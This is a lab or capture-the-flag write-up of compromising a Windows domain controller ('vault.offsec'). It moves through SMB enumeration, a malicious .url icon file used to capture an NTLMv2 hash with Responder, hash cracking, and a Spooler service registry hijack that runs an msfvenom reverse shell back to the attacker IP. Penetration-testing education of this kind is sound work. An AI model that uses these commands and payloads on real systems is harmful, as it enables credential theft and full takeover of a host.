Writeup by wook413

[TOC]

# Recon

## Nmap

As per my standard methodology, I initiated the engagement with three distinct Nmap scans: a full TCP port discovery of all 65,535 ports, a targeted service scan of the identified open ports, and a UDP scan covering the top 10 most common ports.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -Pn -n --open --min-rate 3000 -p-
Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-15 18:56 UTC
Nmap scan report for 192.168.103.172
Host is up (0.046s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 43.89 seconds
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666-49667,49673,49679,49703
Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-15 18:57 UTC
Nmap scan report for 192.168.103.172
Host is up (0.048s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-15 18:58:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-15T18:59:31+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-15T18:58:52+00:00
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-02-14T18:55:27
|_Not valid after:  2026-08-16T18:55:27
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-15T18:58:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 96.58 seconds
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -sU --top-ports 10                                                                                 
Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-15 18:59 UTC
Nmap scan report for 192.168.103.172
Host is up (0.048s latency).

PORT     STATE         SERVICE
53/udp   open          domain
67/udp   open|filtered dhcps
123/udp  open          ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
445/udp  open|filtered microsoft-ds
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
```

# Initial Access

## SMB 139 445

The SMB enumeration revealed that the server allowed **Null Authentication**. During this phase, I immediately noticed a non-default share named `DocumentsShare` .

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient -N -L //$IP                                         

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.103.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

While the share was empty, I confirmed that I had write permissions, allowing me to upload files.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //$IP/DocumentsShare                                
Password for [WORKGROUP\\kali]:
Try "help" to get a list of possible commands.
smb: \\> dir
  .                                   D        0  Fri Nov 19 08:59:02 2021
  ..                                  D        0  Fri Nov 19 08:59:02 2021

                7706623 blocks of size 4096. 711825 blocks available
smb: \\> ls -la
NT_STATUS_NO_SUCH_FILE listing \\-la
smb: \\> put cat.jpg
putting file cat.jpg as \\cat.jpg (107.5 kb/s) (average 107.5 kb/s)
smb: \\> ls
  .                                   D        0  Sun Feb 15 19:01:48 2026
  ..                                  D        0  Sun Feb 15 19:01:48 2026
  cat.jpg                             A    21914  Sun Feb 15 19:01:48 2026

                7706623 blocks of size 4096. 711820 blocks available
```

To gain a foothold, I decided to leverage a “Forced Authentication” attack. This technique exploits how Windows Explorer handles file icons.

I generated a malicious `.url` file.

```bash
gedit wook.url

[InternetShortcut]
URL=whatever
workingDirectory=whatever
IconFile=\\\\192.168.45.229\\%USERNAME%.icon
IconIndex=1
```

Set up a listener using `Responder`

```bash
┌──(kali㉿kali)-[~/Desktop]                                                                                                               
└─$ sudo responder -I tun0 
```

Then I uploaded the malicious file to the `DocumnetsShare` .

```powershell
smb: \\> put wook.url
putting file wook.url as \\wook.url (0.8 kb/s) (average 0.8 kb/s)
smb: \\> dir
  .                                   D        0  Sun Feb 15 19:16:32 2026
  ..                                  D        0  Sun Feb 15 19:16:32 2026
  cat.jpg                             A    21914  Sun Feb 15 19:01:48 2026
  wook.url                            A      112  Sun Feb 15 19:16:32 2026

                7706623 blocks of size 4096. 337846 blocks available
```

The attack is particularly effective because it is “zero-click”. As far as I know, the victim does not need to open the file. Simply browsing the folder triggers **Windows Explorer** to attempt to render the file’s icon.

Upon seeing the **IconFile** path pointing to my IP (e.g., `\\\\192.168.45.229\\%USERNAME%.icon`), Windows automatically sends an SMB request to fetch the image.

My machine, running `Responder` , acted as a rogue SMB server. When the victim’s machine requested the icon, Responder challenged it for authentication. Windows automatically responded by sending the user’s `NetNTLMv2` hash to my Responder instance.

```bash
[+] Listening for events...                                          
                                                                     
[SMB] NTLMv2-SSP Client   : 192.168.103.172            
[SMB] NTLMv2-SSP Username : VAULT\\anirudh                 
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:856d2180f4f18531:DDCA38AA29208B3682DAD85EEA8F1F71:0101000000000000007E7D82AF9EDC01CB37D5187428C
F9B00000000020008004F004C004900360001001E00570049004E002D004F004B00430034004F00530048004E0031005300560004003400570049004E002D004F004B00430
034004F00530048004E003100530056002E004F004C00490036002E004C004F00430041004C00030014004F004C00490036002E004C004F00430041004C00050014004F004
C00490036002E004C004F00430041004C0007000800007E7D82AF9EDC010600040002000000080030003000000000000000010000000020000089AA92A8AA1722767484287
7BD92C0EEF101C15360BF57E99844B804AA2DA3E00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002
E00340035002E003200320039000000000000000000
```

I successfully captured the hash for the user `anirudh` and I saved it to `hash.txt` .

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ echo 'anirudh::VAULT:856d2180f4f18531:DDCA38AA29208B3682DAD85EEA8F1F71:0101000000000000007E7D82AF9EDC01CB37D5187428CF9B00000000020008004F004C004900360001001E00570049004E002D004F004B00430034004F00530048004E0031005300560004003400570049004E002D004F004B00430034004F00530048004E003100530056002E004F004C00490036002E004C004F00430041004C00030014004F004C00490036002E004C004F00430041004C00050014004F004C00490036002E004C004F00430041004C0007000800007E7D82AF9EDC010600040002000000080030003000000000000000010000000020000089AA92A8AA17227674842877BD92C0EEF101C15360BF57E99844B804AA2DA3E00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320039000000000000000000' > hash.txt
```

I verified the hash type with `hashcat --identify hash.txt`

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat --identify hash.txt                                    
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   5600 | NetNTLMv2                                                  | Network Protocol
```

I successfully cracked it using the `rockyou.txt` wordlist.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
ANIRUDH::VAULT:856d2180f4f18531:ddca38aa29208b3682dad85eea8f1f71:0101000000000000007e7d82af9edc01cb37d5187428cf9b00000000020008004f004c004900360001001e00570049004e002d004f004b00430034004f00530048004e0031005300560004003400570049004e002d004f004b00430034004f00530048004e003100530056002e004f004c00490036002e004c004f00430041004c00030014004f004c00490036002e004c004f00430041004c00050014004f004c00490036002e004c004f00430041004c0007000800007e7d82af9edc010600040002000000080030003000000000000000010000000020000089aa92a8aa17227674842877bd92c0eef101c15360bf57e99844b804aa2da3e00a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320039000000000000000000:SecureHM
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ANIRUDH::VAULT:856d2180f4f18531:ddca38aa29208b3682d...000000
Time.Started.....: Sun Feb 15 19:18:42 2026 (14 secs)
Time.Estimated...: Sun Feb 15 19:18:56 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   769.3 kH/s (0.97ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10610688/14344385 (73.97%)
Rejected.........: 0/10610688 (0.00%)
Restore.Point....: 10608640/14344385 (73.96%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Sekhmet* -> Schwangerschaft1
Hardware.Mon.#1..: Util: 69%

Started: Sun Feb 15 19:18:41 2026
Stopped: Sun Feb 15 19:18:58 2026
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nxc smb $IP -u 'anirudh' -p 'SecureHM'
SMB         192.168.103.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.103.172 445    DC               [+] vault.offsec\\anirudh:SecureHM
```

# Shell as `anirudh`

I successfully established a remote shell as `anirudh` using `evil-winrm`.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ evil-winrm -i $IP -u anirudh -p SecureHM                
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\anirudh\\Documents> whoami
vault\\anirudh
```

Found `local.txt`

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> type local.txt
fa3...
```

# Privilege Escalation

Once inside, I observed that `anirudh` held several privileges that suggested a path to local administrative access.

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

I uploaded `PrivescCheck.ps1` to the target host.

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> upload PrivescCheck.ps1
                                        
Info: Uploading /home/kali/Desktop/PrivescCheck.ps1 to C:\\Users\\anirudh\\Desktop\\PrivescCheck.ps1
                                        
Data: 296376 bytes of 296376 bytes copied
                                        
Info: Upload successful!
```

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> . .\\PrivescCheck.ps1
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> Invoke-PrivescCheck -Format TXT, HTML
```

I ran `PrivescCheck.ps1` , which identified multiple “**High”** severity vulnerabilities. I chose to exploit the **Registry Permissions** vulnerability.

```powershell
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                 ~~~ PrivescCheck Summary ~~~            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 TA0004 - Privilege Escalation
 -
 Services - Permissions →
 High
 -
 Services - Registry Permissions →
 High
 -
 User - Privileges →
 High
 TA0006 - Credential Access
 -
 Credentials - WinLogon →
 Medium
 -
 Hardening - Credential Guard →
 Low
 -
 Hardening - LSA Protection →
 Low
 TA0008 - Lateral Movement
 -
 Hardening - LAPS →
 Medium
```

In Windows, every service stores its configuration-including the path to its executable- in the registry under `HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>` . A vulnerability exists here if a low-privileged user has **Write** or **Full Control** access to this registry key due to improperly configured ACLs.

I targeted the `Spooler` service, which was running with `LocalSystem` privileges. Since I had `GenericWrite` permissions on its registry keys, I could modify the `ImagePath` value.

```powershell
Name              : Spooler                                                                                                               
ImagePath         : C:\\Windows\\System32\\spoolsv.exe                                                                                       
User              : LocalSystem                                                                                                           
ModifiablePath    : HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler                                                                        
IdentityReference : BUILTIN\\Server Operators (S-1-5-32-549)                                                                               
Permissions       : QueryValue, SetValue, CreateSubKey, EnumerateSubKeys, Notify, Delete, ReadControl, GenericWrite, GenericRead          
Status            : Running                                                                                                               
UserCanStart      : False                                                                                                                 
UserCanStop       : False
```

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler

HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler
    DependOnService    REG_MULTI_SZ    RPCSS\\0http
    Description    REG_SZ    @%systemroot%\\system32\\spoolsv.exe,-2
    DisplayName    REG_SZ    @%systemroot%\\system32\\spoolsv.exe,-1
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    100E000000000000000000000300000014000000010000008813000001000000881300000000000000000000
    Group    REG_SZ    SpoolerGroup
    ImagePath    REG_EXPAND_SZ    %SystemRoot%\\System32\\spoolsv.exe
    ObjectName    REG_SZ    LocalSystem
    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\\0SeImpersonatePrivilege\\0SeAuditPrivilege\\0SeChangeNotifyPrivilege\\0SeAssignPrimaryTokenPrivilege\\0SeLoadDriverPrivilege
    ServiceSidType    REG_DWORD    0x1
    Start    REG_DWORD    0x2
    Type    REG_DWORD    0x110

HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler\\Performance
HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler\\Security
```

I generated a malicious reverse shell payload (`wook.exe`) and transferred it to the target host.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=80 -f exe -o wook.exe       
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: wook.exe
```

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> upload wook.exe
                                        
Info: Uploading /home/kali/Desktop/wook.exe to C:\\Users\\anirudh\\Desktop\\wook.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
```

After setting up a local listener on port 80, I used `reg add` command to replace the original `ImagePath` of the `Spooler` service with the path to my malicious executable. `C:\\Users\\anirudh\\Desktop\\wook.exe` .

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ rlwrap nc -lvnp 80
```

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler /v ImagePath /t REG_EXPAND_SZ /d C:\\Users\\anirudh\\Desktop\\wook.exe /f
The operation completed successfully.
```

I queried the registry to confirm the overwrite was successful.

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler

HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler
    DependOnService    REG_MULTI_SZ    RPCSS\\0http
    Description    REG_SZ    @%systemroot%\\system32\\spoolsv.exe,-2
    DisplayName    REG_SZ    @%systemroot%\\system32\\spoolsv.exe,-1
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    100E000000000000000000000300000014000000010000008813000001000000881300000000000000000000
    Group    REG_SZ    SpoolerGroup
    ImagePath    REG_EXPAND_SZ    C:\\Users\\anirudh\\Desktop\\wook.exe
    ObjectName    REG_SZ    LocalSystem
    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\\0SeImpersonatePrivilege\\0SeAuditPrivilege\\0SeChangeNotifyPrivilege\\0SeAssignPrimaryTokenPrivilege\\0SeLoadDriverPrivilege
    ServiceSidType    REG_DWORD    0x1
    Start    REG_DWORD    0x2
    Type    REG_DWORD    0x110

HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler\\Performance
HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler\\Security
```

Since I lacked the permissions to restart the service manually, I opted to restart the entire machine to trigger the service execution.

```powershell
*Evil-WinRM* PS C:\\Users\\anirudh\\Desktop> shutdown /r
```

# Shell as `SYSTEM`

Shortly after the reboot, the service attempted to start, executing my payload as `LocalSystem` and granting me a reverse shell with full administrative privileges.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ rlwrap nc -lvnp 80    
listening on [any] 80 ...
connect to [192.168.45.229] from (UNKNOWN) [192.168.103.172] 49682
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32>whoami
whoami
nt authority\\system
```

Found `proof.txt`

```cmd
C:\\Users\\Administrator\\Desktop>type proof.txt
type proof.txt
bfb...
```

